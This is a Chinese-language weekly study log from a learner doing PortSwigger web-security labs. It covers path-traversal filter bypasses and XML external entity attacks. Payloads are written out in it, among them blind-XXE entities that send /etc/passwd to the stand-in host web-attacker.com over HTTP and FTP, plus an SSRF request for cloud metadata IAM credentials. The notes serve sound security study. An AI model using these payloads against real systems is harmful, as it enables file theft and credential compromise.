# <font style="color:rgb(38, 38, 38);">完成事项</font>
1. 依旧portswigger靶场
> + 路径遍历通关
> + XML外部实体注入（XXE）通关
2. 学习网络基础知识
# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
1. 继续portswigger靶场，重点sql注入
2. 目前有些基础了，想在b站上学学web渗透

# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
#### 一. 路径遍历
本身没什么可讲的，利用参数传递文件路径，尝试../等方式访问系统敏感文件
> 在windows下，路径分隔符可以是\或/，但在linux下只能是/

这里讲一下绕过路径遍历过滤的几种方法
**1. 若只读取参数作为文件名，可以考虑使用绝对路径**
```php
filename=/etc/passwd
```
**2. 双写绕过....//**
**3. url编码，包括双重url编码和不规则编码绕过**
> /其实存在许多不规则编码方式，最为经典的是MS00-078漏洞：在古早的IISweb服务器上，存在Unicode编码解析漏洞，他会对处理结果继续运算
%c1%1c->(0xc1-0xc0)*0x40+0x1c=0x5c='/'
%c0%2f->(0xc0-0xc0)*0x40+0x2f=0x2f='\\'
还有一种不规则编码即全角斜杠
%ef%bc%8f
**4. 若要求特定后缀检测，使用%00截断**
```php
filename=../../../etc/passwd%00.png
```
#### 二. XML外部实体注入
首先明确几个概念:
+ XML:可扩展标记语言，用于存储和传输数据，与HTML类似。在JSON流行之前，XML是web数据交换的主要格式
+ DTD:文档类型定义，定义XML标签的统一标准
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE 根元素名称 [
    <!ELEMENT 元素名 (子元素)> 
    #子元素格式: EMPTY(空), ANY(任意), (#PCDATA)(文本)，（子元素1|子元素2)(选择其一)，(子元素1,子元素2)(顺序)
    <!ENTITY 实体名 "实体内容">
    #定义XML实体，用 &实体名; 引用
]>
<根元素名称>
  ...
</根元素名称>
```
+ XML实体:即XML中的变量，可以在XML文档中定义和引用。
有预定义实体(\&lt;(<) \&gt;(>) \&amp;(&) \&apos;(') \&quot;("))
还可以通过DTD自定义实体(\<!ENTITY name "value">)，其中自定义实体可以引用外部资源(本地文件或远程URL)
```xml
<!ENTITY ext SYSTEM "http://normal-website.com" > ]>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
# 关键字SYSTEM，表示引用外部资源
```
**1. 注入XXE检索文件**
>即注入自定义实体再引用实体，从而实现任意文件读取

检查XML解析触发点，再触发后用bp抓包，xml标签就在POST请求中。分别在DTD中注入自定义实体，引用本地敏感文件路径并篡改xml内容
![](https://raw.githubusercontent.com/UK5555544/uky_images/main/blogs/20260117130127.png)
2. SSRF
由于XXE同样可以注入远程url，故可以实现ssrf攻击，方法和上面类似
>ssrf获取云服务的最新元数据服务: 内网访问http://169.254.169.254/latest/meta-data/
169.254.169.254是AWS、Azure等云服务商的元数据服务地址，通过ssrf可以获取实例的配置信息和凭证(角色信息)，从而进行越权

```xml
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```
**3. 盲XXE**

当服务端返回过滤了xml信息，这时候我们就需要带外技术(OAST)了
一般服务端的响应报文叫内带，而引诱服务端发送报文到攻击者控制的服务器，这就是外带
burpsuite的collaborator就是一个很好的带外服务器，可以监听dns和http请求，点击即可生成一个带外域名，然后再发出xml请求后观察collaborator的交互记录
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```
光这点还不够，我们还需要访问敏感信息
我们可以先定义一个参数实体
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
```
>参数实体:当普通实体被禁止创建时，可以使用参数实体代替，参数实体以%开头，并且只能在DTD内部使用
```xml
<!ENTITY % myparameterentity "my parameter entity value" > #定义
%myparameterentity; #引用
```
我们再构造一个嵌套实体
```xml
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
# &#x25;是%的十六进制编码，为了规避解析错误
%eval;
%exfiltrate;
# 引用
```
这里先引用了eval，使exfiltrate参数实体被定义并储存再内存中，然后引用exfiltrate，此时x后的file也会被xml解析。于是file:///etc/passwd的内容就会跟在参数x的后面等待被collaborator捕获

还有一点需要操心，窃取的文件里可能包含换行符等非法字符，这些字符禁止拼接在url中。为了解决这个问题，我们可以用ftp协议，因为ftp协议允许在url中包含换行符等非法字符
```xml
<!ENTITY % exfiltrate SYSTEM 'ftp://web-attacker.com?x=%file;'>">
```

还有一种情况，如果返回报文中xml只是报错，我们可以利用类似sql报错注入的方法替代上面的带外技术，用法类似
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
nonexistent是一个不存在的文件，触发报错时，file实体的内容就会被包含在报错信息中返回，从而实现盲注
**4. 无法篡改xml怎么办**
盲xxe好歹是响应被过滤，而这种情况是让你发送的机会都没有
在放弃考虑xml漏洞之前，先观察是否有参数可以控制
+ XInclude攻击（当DOCTYPE不被允许修改）

在一些支持XInclude的XML解析器中，可以利用XInclude标签来包含外部资源，因为XInclude允许包含xml片段

在参数处篡改
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> #命名空间声明
<xi:include parse="text" href="file:///etc/passwd"/></foo>
# 文本形式读取任意文件
```
+ 修改MIME类型

将Content-Type修改为text/xml，就可以在请求体中输入xml数据，前提是可以提交这种类型
# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
学习了路径遍历和XXE两种常见的web漏洞，了解了基本原理和利用方法
# <font style="color:rgb(38, 38, 38);">杂项</font>
1. 正在备考科目一科目二中
2. 这周在学英语口语占用了不少时间，还好已经结课了